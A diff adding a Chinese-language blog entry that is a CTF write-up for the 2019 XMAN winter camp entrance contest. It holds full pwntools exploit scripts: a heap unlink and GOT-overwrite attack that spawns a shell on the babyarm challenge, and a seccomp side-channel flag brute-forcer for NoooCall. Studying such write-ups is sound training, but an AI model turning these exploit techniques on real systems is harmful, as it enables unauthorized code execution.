@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>2019XMAN冬令营入营赛</title>
+      <link href="/2020/01/11/2019xman-ru-ying-sai/"/>
+      <url>/2020/01/11/2019xman-ru-ying-sai/</url>
+      
+        <content type="html"><![CDATA[<h1 id="2019XMAN入营赛"><a href="#2019XMAN入营赛" class="headerlink" title="2019XMAN入营赛"></a>2019XMAN入营赛</h1><p>XMAN训练营的题目，还是能学到不少东西的，就拿来看了看。</p><h3 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h3><p>这个题目并不难，难在于它是一个arm的架构，所以难以调试，不过从出题人哪里得到一个很好的github项目<strong>arm_now</strong>，但是我看了看还是没办法用pwntools远程连接上调试，Mr.R师傅说环境下载在arm_now里面然后在里面直接调，不走远程路线，这虽然麻烦一点，但是麻烦过后属实方便顺心，废话到此，分析题目。<br>checksec使得我们有个大致的了解：</p><pre><code>[*] &#39;/home/root0/pratice/2019xman\xe5\x86\xac\xe4\xbb\xa4\xe8\x90\xa5/babyarm/pwn&#39;    Arch:     arm-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x10000)</code></pre><p>开了两个保护Canary found和NX，不过对这题堆利用影响不大。</p><p>漏洞在于delete函数没有将free后的堆块指针置NULL</p><img src="/2020/01/11/2019xman-ru-ying-sai/1.png" title="This is an image"><p>配合32位的unlink可以实现堆利用，不过这个题目方法很多样，unsorted bin attack泄露地址然后double free估计也可以，没试，哈哈哈，贴一个<a href="https://binlep.github.io/2019/12/24/%E3%80%90WriteUp%E3%80%91%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E5%8D%8E%E4%B8%BA%E6%9D%AF%E2%80%9DXMan%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">binLep师傅</a>的脚本（也可以去看看师傅博客）:</p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *debug = 3context(log_level=&quot;debug&quot;, arch=&quot;arm&quot;, os=&quot;linux&quot;)if debug == 1:    p = process([&#39;qemu-arm&#39;, &#39;-g&#39;, &#39;12345&#39;, &#39;-L&#39;, &#39;/usr/arm-linux-gnueabihf&#39;, &#39;./chall&#39;])elif debug == 2:    p = process([&#39;qemu-arm&#39;, &#39;-L&#39;, &#39;/usr/arm-linux-gnueabihf&#39;, &#39;./chall&#39;])else:    p = remote(&#39;139.9.133.160&#39;, 10000)elf = ELF(&#39;./chall&#39;, checksec=False)def add(add_size, add_content):    p.sendafter(&#39;  your choice: \n&#39;, &#39;1&#39;)    p.sendlineafter(&#39;Note size :&#39;, str(add_size))    p.sendafter(&#39;Content :&#39;, add_content)def delete(delete_idx):    p.sendafter(&#39;  your choice: \n&#39;, &#39;2&#39;)    p.sendlineafter(&#39;Index :&#39;, str(delete_idx))def show(show_idx):    p.sendafter(&#39;  your choice: \n&#39;, &#39;3&#39;)    p.sendafter(&#39;Index :&#39;, str(show_idx))def edit(edit_idx, edit_content):    p.sendafter(&#39;  your choice: \n&#39;, &#39;5&#39;)    p.sendafter(&#39;Index :&#39;, str(edit_idx))    p.sendafter(&#39;You content:&#39;, edit_content)got_free = elf.got[&#39;free&#39;]got_atoi = elf.got[&#39;atoi&#39;]plt_puts = elf.plt[&#39;puts&#39;]addr_notelist = 0x02108caddr_count = 0x021064p.sendlineafter(&#39;Tell me your name:&#39;, &#39;binLep&#39;)add(0x40, &#39;a&#39; * 4)  # 1add(0x80, &#39;b&#39; * 4)  # 2add(0x80, &#39;c&#39; * 4)  # 3delete(1)delete(2)pd = p32(0) + p32(0x81)pd += p32(addr_notelist - 0xc) + p32(addr_notelist - 0x8)pd += &#39;d&#39; * 0x70pd += p32(0x80) + p32(0x80)add(0x100, pd)  # 4delete(2)pd = p32(0) + p32(0)pd += p32(got_atoi) + p32(got_free)edit(1, pd)add(0x80, &#39;/bin/sh&#39;)  # 5add(0x80, &#39;/bin/sh&#39;)  # 6add(0x80, &#39;/bin/sh&#39;)  # 7add(0x80, &#39;/bin/sh&#39;)  # 8add(0x80, &#39;/bin/sh&#39;)  # 9edit(1, p32(plt_puts))delete(0)addr_atoi = u32(p.recv(4))libcbase = addr_atoi - 0x025271addr_system = libcbase + 0x02c771addr_bin_sh = libcbase + 0x0ca574edit(1, p32(addr_system))success(&#39;addr_atoi   = &#39; + hex(addr_atoi))success(&#39;addr_system = &#39; + hex(addr_system))delete(7)p.interactive()</code></pre><h3 id="NoooCall"><a href="#NoooCall" class="headerlink" title="NoooCall"></a>NoooCall</h3><p>这个题目的难度在于禁用了所有的系统调用，不过跟红帽的比觉得还是简单一点。<br>你输入的被当做shellcode执行了</p><img src="/2020/01/11/2019xman-ru-ying-sai/2.png" title="This is an image"><p>这里面就是禁用了所有系统调用。</p><pre><code>#!/usr/bin/env python# coding=utf-8from pwn import * from string import printable #导入可打印的字符的字符串context(arch = &#39;amd64&#39;,os = &#39;linux&#39;)idx = 0x200000000flag = &quot;&quot;for j in range(0xd):    for i in printable:        r = process(&#39;./chall&#39;)        payload = &#39;&#39;&#39;            mov rdi,{}            cmp byte ptr [rdi],{}            jz $            ret        &#39;&#39;&#39;.format(hex(idx + j),ord(i))        payload = asm(payload)        r.recv()#        gdb.attach(r)        r.send(payload)        try:            r.recv(timeout=1)            flag += i            print &quot;key &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + flag            break        except:            continueprint flagr.interactive()</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF题解 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2019湖湘杯</title>
       <link href="/2019/11/20/2019-hu-xiang-bei/"/>
       <url>/2019/11/20/2019-hu-xiang-bei/</url>
